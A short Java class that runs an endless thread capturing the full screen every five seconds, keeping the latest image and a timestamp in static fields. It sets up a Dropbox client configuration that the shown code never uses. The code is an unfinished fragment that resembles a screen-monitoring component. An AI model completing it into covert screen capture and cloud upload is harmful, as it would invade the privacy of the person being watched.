package com.company;
import com.dropbox.core.DbxRequestConfig;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.lang.Exception;
import java.text.SimpleDateFormat;
import java.util.Date;

public class SimpleScreenShotter extends Thread {
    public static BufferedImage screenShot;
    public static String imageName;
    SimpleDateFormat formatter = new SimpleDateFormat("yyyyMMdd_HHmmss");
    DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();

    @Override
    public void run() {
        while(true)
        {
            try
            {
                Robot r = new Robot();
                screenShot = r.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                Date todayDate = new Date();
                imageName = formatter.format(todayDate);
                sleep(5000);
            }
            catch(Exception ex)
            {
                ex.printStackTrace();
            }
        }
    }

}

